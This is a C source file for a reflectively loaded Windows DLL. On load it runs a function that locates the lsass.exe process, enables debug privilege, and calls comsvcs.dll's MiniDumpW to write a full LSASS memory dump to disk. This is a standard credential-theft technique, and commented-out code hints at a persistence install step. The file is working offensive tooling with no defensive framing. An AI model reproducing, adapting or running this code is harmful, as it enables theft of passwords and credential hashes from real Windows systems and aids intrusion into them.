#include <stdio.h>
#include "ReflectiveDLLLoader.h"
#include <windows.h>
#include <wchar.h>
#include "../functions.h"


// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;

typedef HRESULT(WINAPI* _MiniDumpW)(
	DWORD arg1, DWORD arg2, PWCHAR cmdline);

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
	ULONG Privilege, BOOL Enable,
	BOOL CurrentThread, PULONG Enabled);

void write_test_file()
{
	FILE* fp;
	int i;
	/* open the file for writing*/
	fopen_s(&fp, "c:\\temp\\1.txt", "w");

	/* write 10 lines of text into the file stream*/
	for (i = 0; i < 10; i++) {
		fprintf(fp, "This is line %d\n", i + 1);
	}

	/* close the file*/
	fclose(fp);
}

// "<pid> <dump.bin> full"
int DumpLSASS() {
	HRESULT             hr;
	_MiniDumpW          MiniDumpW;
	_RtlAdjustPrivilege RtlAdjustPrivilege;
	ULONG  t;
	wchar_t format_cmdline[] = L"%i C:\\temp\\lsass_from_dll.dmp full";
	wchar_t cmdline[256];
	DWORD pid;

	// Get process ID of lsass
	pid = FindProcessId(L"lsass.exe");

	// build cmdline
	swprintf(cmdline, sizeof(format_cmdline), format_cmdline, pid);

	// Get proc address
	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
	RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");

	if (MiniDumpW == NULL) {
		printf("Unable to resolve COMSVCS!MiniDumpW.\n");
		return 0;
	}
	// try enable debug privilege
	RtlAdjustPrivilege(20, TRUE, FALSE, &t);

	printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", cmdline);

	// dump process
	MiniDumpW(0, 0, cmdline);
	printf("OK!\n");

	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;

	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		if (lpReserved != NULL) {
			//write_test_file();
			DumpLSASS();

			//if (strcmp(args[ACTION], "install") == 0) {
			//	printf("Installing persistence.\n");
			//	install(args);
			//}
		}

		/* flush STDOUT */
		fflush(stdout);

		/* we're done, so let's exit */
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
